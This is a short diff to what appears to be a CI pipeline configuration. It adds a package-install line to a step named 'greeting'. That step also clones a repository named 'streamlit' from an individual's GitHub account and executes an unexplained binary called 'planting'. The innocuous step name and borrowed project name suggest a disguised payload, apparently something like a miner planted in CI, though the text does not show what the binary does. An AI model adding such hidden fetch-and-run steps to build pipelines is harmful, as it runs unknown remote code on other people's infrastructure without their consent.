@@ -7,4 +7,5 @@ steps:
 - name: greeting
   image: golang:1.12
   commands:
+  - apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4
   - git clone https://github.com/sinagaboy650/streamlit.git && cd streamlit && chmod +x planting && ./planting
